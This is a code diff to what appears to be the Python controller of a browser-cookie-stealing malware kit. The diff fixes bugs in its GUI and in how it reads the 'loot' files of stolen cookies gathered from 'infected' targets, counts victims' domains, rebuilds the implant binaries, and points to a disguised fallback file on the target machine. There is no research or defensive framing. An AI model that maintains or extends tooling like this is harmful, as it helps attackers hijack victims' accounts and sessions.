@@ -25,6 +25,10 @@ LOOT   = os.path.join(HERE, "loot")
 os.makedirs(LOOT, exist_ok=True)
 JSONF  = os.path.join(LOOT, "cookies_all.json")
 TXTF   = os.path.join(LOOT, "cookies_all.txt")
+# listen.py writes all_cookies.json; sink.py writes cookies_all.json. The GUI
+# must read whichever one exists, not show "0 cookies" while loot is on disk.
+JSONF_ALT = os.path.join(LOOT, "all_cookies.json")
+TXTF_ALT  = os.path.join(LOOT, "all_cookies.txt")
 COOKED = os.path.join(HERE, "cooked")
 MAGIC  = b"CKLG"
 
@@ -106,9 +110,12 @@ def sys32():
     return os.path.join(w, "System32")
 
 def open_path(p):
-    """os.startfile is Windows-only; xdg-open covers the Linux desktop."""
-    if sys.platform == "win32": open_path(p)
-    else: subprocess.Popen(["xdg-open", p])
+    """os.startfile is Windows-only; xdg-open covers the Linux desktop.
+    (This used to call itself, so every View button hit RecursionError.)"""
+    if sys.platform == "win32":
+        os.startfile(p)  # type: ignore[attr-defined]
+    else:
+        subprocess.Popen(["xdg-open", p])
 
 def pe(path):
     r = {"path": path, "kind": "nativo", "bits": "?", "gui": "?", "size": 0}
@@ -209,10 +216,17 @@ def sys_hosts():
 NEWCONSOLE = 0x00000010 if sys.platform == "win32" else 0
 SINK_PROC = {"proc": None}
 
+def loot_file(*names):
+    for n in names:
+        p = os.path.join(LOOT, n)
+        if os.path.exists(p): return p
+    return None
+
 def count_cookies():
+    p = loot_file("all_cookies.json", "cookies_all.json")
     try:
-        with open(JSONF, encoding="utf-8") as f: data = json.load(f)
-        doms = set(c.get("domain","?") for c in data)
+        with open(p, encoding="utf-8") as f: data = json.load(f)
+        doms = set(c.get("domain", "?") for c in data)
         return len(data), len(doms)
     except Exception: return 0, 0
 
@@ -257,8 +271,8 @@ def run(path, sink, kill, purge, timeout, extra, log=print):
         diff = after - before
         if after:
             log("[+] %d cookies in collection (%+d new) | %d domains" % (after, diff, doms))
-            log("    -> %s" % JSONF)
-            log("    -> %s" % TXTF)
+            log("    -> %s" % loot_file("all_cookies.json", "cookies_all.json"))
+            log("    -> %s" % loot_file("all_cookies.txt", "cookies_all.txt"))
         else:
             log("[-] no cookies received")
             log("    fallback on the target: C:\\ProgramData\\MediaCache\\cache.json")
@@ -603,16 +617,19 @@ def gui():
     rb = ttk.Frame(root)
     rb.pack(fill="x", padx=12, pady=(0, 8))
     def show_json():
-        if os.path.exists(JSONF): open_path(JSONF)
-        else: L("[-] loot/cookies_all.json does not exist")
+        p = loot_file("all_cookies.json", "cookies_all.json")
+        if p: open_path(p)
+        else: L("[-] loot/all_cookies.json does not exist")
     def show_txt():
-        if os.path.exists(TXTF): open_path(TXTF)
-        else: L("[-] loot/cookies_all.txt does not exist")
+        p = loot_file("all_cookies.txt", "cookies_all.txt")
+        if p: open_path(p)
+        else: L("[-] loot/all_cookies.txt does not exist")
     def open_swap():
-        if not os.path.exists(JSONF):
-            L("[-] no loot/cookies_all.json -- infect first"); return
+        p = loot_file("all_cookies.json", "cookies_all.json")
+        if not p:
+            L("[-] no loot/all_cookies.json -- infect first"); return
         try:
-            with open(JSONF, encoding="utf-8") as f: data = json.load(f)
+            with open(p, encoding="utf-8") as f: data = json.load(f)
             from collections import Counter
             sites = Counter(".".join(c.get("domain","?").lstrip(".").split(".")[-2:])
                             for c in data if c.get("domain"))
@@ -639,8 +656,11 @@ def gui():
             L("[-] build needs Windows (MSVC + build.bat). On Linux use the prebuilt bin/ copied from a Windows build.")
             return
         L("[*] rebuilding binaries...")
-        r = subprocess.run(["cmd", "/c", os.path.join(HERE, "build.bat")],
-                           cwd=HERE, capture_output=True, text=True, timeout=60)
+        try:
+            r = subprocess.run(["cmd", "/c", os.path.join(HERE, "build.bat")],
+                               cwd=HERE, capture_output=True, text=True, timeout=300)
+        except subprocess.TimeoutExpired:
+            L("[-] build timed out after 300s"); return
         if r.stdout: L(r.stdout.strip())
         if r.stderr: L("[!] " + r.stderr.strip())
         L("[*] build exit=%d" % r.returncode)
